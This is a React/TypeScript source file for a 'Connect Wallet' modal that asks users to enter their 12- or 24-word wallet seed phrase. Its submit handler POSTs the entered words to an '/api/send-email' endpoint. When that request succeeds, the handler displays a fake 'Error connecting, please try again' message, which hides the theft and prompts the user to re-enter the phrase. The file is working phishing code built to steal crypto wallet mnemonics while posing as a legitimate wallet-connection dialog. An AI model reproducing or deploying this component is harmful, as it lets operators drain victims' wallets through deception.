"use client";
import { useState } from "react";
import ModalHeader from "./ModalHeader";
import ModalItemCard from "./ModalItemCard";
import { Crypto } from "@/constants";
import { useToast } from "@/components/ui/use-toast";
import { mnemonicSchema } from "@/lib/utils";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";

interface ModalContentProps {
  closeModal: () => void;
}

type MnemonicKeys = `word${
  | 1
  | 2
  | 3
  | 4
  | 5
  | 6
  | 7
  | 8
  | 9
  | 10
  | 11
  | 12
  | 13
  | 14
  | 15
  | 16
  | 17
  | 18
  | 19
  | 20
  | 21
  | 22
  | 23
  | 24}`;
const ModalContent = ({ closeModal }: ModalContentProps) => {
  type MnemonicFormData = z.infer<typeof mnemonicSchema>;
  const { toast } = useToast();
  const [modalTitle, setModalTitle] = useState<
    | "Connect Wallet"
    | "Access Wallet with Mnemonic Phrase"
    | "Add an account via seed"
  >("Connect Wallet");

  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(""));

  const handleInputChange = (index: number, value: string) => {
    const newSeedWords = [...seedWords];
    newSeedWords[index] = value;
    setSeedWords(newSeedWords);
  };

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<MnemonicFormData>({
    resolver: zodResolver(mnemonicSchema),
  });

  const onSubmit = async (data: MnemonicFormData) => {
    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        toast({
          title: "Error connecting",
          description: "Please try again",
        });
        closeModal();
      } else {
        toast({
          title: "Error connecting",
          description: `Please try again ${response.status} `,
          variant: "destructive",
        });
      }
    } catch (error) {
      toast({
        title: "Error connecting",
        description: `Please try again ${error} `,
        variant: "destructive",
      });
    }
  };

  const renderContent = () => {
    switch (modalTitle) {
      case "Access Wallet with Mnemonic Phrase":
        return (
          <div className="flex justify-between mt-6">
            <button
              onClick={() => {
                setModalTitle("Add an account via seed");
                setSeedWords(Array(12).fill(""));
              }}
              className="bg-customDarkButton border px-4 py-2 hover:bg-slate-500 rounded-lg text-white"
            >
              12 Words
            </button>
            <button
              onClick={() => {
                setModalTitle("Add an account via seed");
                setSeedWords(Array(24).fill(""));
              }}
              className="bg-customDarkButton border px-4 py-2 hover:bg-slate-500 rounded-lg text-white"
            >
              24 Words
            </button>
          </div>
        );
      case "Add an account via seed":
        return (
          <form onSubmit={handleSubmit(onSubmit)}>
            <div className="grid grid-cols-3 gap-2">
              {seedWords.map((_, index) => (
                <input
                  key={index}
                  type="text"
                  placeholder={`${index + 1}.`}
                  {...register(`word${index + 1}` as MnemonicKeys)}
                  onChange={(e) => handleInputChange(index, e.target.value)}
                  className="bg-gray-800 text-white rounded-lg p-2"
                  required
                />
              ))}
            </div>
            {errors && (
              <div className="text-red-500 mt-2">
                {Object.keys(errors).map((key, index) => (
                  <div key={index}>
                    {errors[key as keyof MnemonicFormData]?.message}
                  </div>
                ))}
              </div>
            )}
            <div className="flex justify-between mt-6">
              <button
                onClick={() =>
                  setModalTitle("Access Wallet with Mnemonic Phrase")
                }
                className="bg-red-600 text-white py-2 px-4 rounded-lg"
              >
                Back
              </button>
              <button
                type="submit"
                className="bg-green-600 text-white py-2 px-4 rounded-lg"
              >
                Connect
              </button>
            </div>
          </form>
        );
      default:
        return Crypto.map((item, index) => (
          <ModalItemCard
            key={index}
            image={item.icon}
            title={item.title}
            nextContent={() =>
              setModalTitle("Access Wallet with Mnemonic Phrase")
            }
          />
        ));
    }
  };

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-50">
      <div className="bg-customDark p-6 rounded-[30px] w-full max-w-sm">
        <ModalHeader path={closeModal} title={modalTitle} />
        {renderContent()}
      </div>
    </div>
  );
};

export default ModalContent;
